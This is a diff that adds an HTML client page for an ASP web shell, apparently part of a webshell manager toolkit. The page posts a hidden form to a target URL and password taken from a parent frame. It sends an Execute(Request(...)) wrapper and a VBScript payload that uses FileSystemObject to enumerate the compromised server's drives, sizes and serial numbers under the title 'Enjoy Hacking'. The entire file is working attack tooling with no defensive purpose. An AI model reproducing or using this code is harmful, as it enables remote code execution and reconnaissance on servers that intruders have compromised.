@@ -1,0 +1,14 @@
+<link rel="stylesheet" type="text/css" href="lake2.css">
+<div align="center">Get Drives </div>
+<form method="post" name="xform" target="_blank">
+  <input type="hidden" name="code" value='Execute("Execute(Request(""fuck""))")'> 
+  <input type="hidden" name="fuck" value="">
+</form>
+<script>
+function RUNonclick(){
+document.xform.fuck.value = 'response.clear\nSet fso=CreateObject("Scripting.FileSystemObject")\nSet dc=fso.Drives\nStrResult="<title>Enjoy Hacking</title><table width=80% border=1 align=center><tr><td colspan=8 align=center><b>Get Drives</b></td></tr><tr><td>Name</td><td>VolumeName</td><td>Type</td><td>IsReady</td><td>FileSystem</td><td>AvailableSpace</td><td>TotalSize</td><td>SerialNumber</td></tr>"\nFor Each d in dc\ns=s&"<tr><td>"&d.DriveLetter&"</td>"\nIf d.DriveType=3 Then\nn=d.ShareName\nElseIf d.IsReady Then\ns=s&"<td>"&d.VolumeName&"</td><td>"&GetType(d.DriveType)&"</td><td>"&d.IsReady&"</td><td>"&d.FileSystem&"</td><td>"&GetSize(d.AvailableSpace)&"</td><td>"&GetSize(d.TotalSize)&"</td><td>"&d.SerialNumber&"</td></tr>"\nElseIf d.IsReady=False Then\ns=s&"<td colspan=7 align=center>Not Ready</td></tr>"\nEnd If\nNext\nStrResult=StrResult&s&"</table>"\nresponse.write(StrResult)\nresponse.end\nFunction GetType(tmp)\nSelect Case tmp\nCase 0: tmp="Unknow"\nCase 1: t="REMOVABLE"\nCase 2: t="FIXED"\nCase 3: t="Remote"\nCase 4: t="CDROM"\nCase 5: t="RAM Disk"\nEnd Select\nGetType=t\nEnd Function\nFunction GetSize(theSize)\nIf theSize >= (1024 * 1024 * 1024) Then getSize=Fix((theSize/(1024*1024*1024))*100)/100&" G"\nIf theSize>=(1024*1024) And theSize<(1024*1024*1024) Then getSize=Fix((theSize/(1024*1024))*100)/100&" M"\nIf theSize>=1024 And theSize<(1024*1024) Then getSize = Fix((theSize/1024)*100)/100 & " K"\nIf theSize>=0 And theSize<1024 Then getSize=theSize&" B"\nEnd Function';
+document.xform.code.name = parent.pwd.value;
+document.xform.action = parent.url.value;
+document.xform.submit();
+}
+</script>
